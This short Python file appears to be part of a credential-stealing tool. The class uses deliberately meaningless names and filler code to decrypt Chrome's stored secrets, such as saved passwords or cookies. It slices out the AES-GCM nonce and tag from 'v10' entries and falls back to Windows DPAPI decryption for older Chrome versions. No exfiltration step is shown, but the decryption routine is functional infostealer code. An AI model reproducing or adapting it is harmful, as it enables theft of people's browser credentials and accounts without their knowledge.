from Crypto.Cipher import AES as quickaxd
import win32crypt

class quicka:
    def __init__(self) -> None:
        self.value = None
        self.figure = -16
        self.number = 12 - 12
    def mainFunc(self, entry, key):
        for f in range(0, 12):
            f += 1
        try:
            crypthon = entry[3:15]
            entry = entry[15:]
            decrypt_value = quickaxd.new(key, quickaxd.MODE_GCM, crypthon)
            return decrypt_value.decrypt(entry)[:self.figure].decode("utf-8") # decrypt value
        except:
            try: # if the user is using a version earlier than chrome 80 
                return str(win32crypt.CryptUnprotectData(entry,self.value, self.value, self.value, self.number)[1])
            except:
                return "An unexpected error has occurred"  #if any error occurs 
    

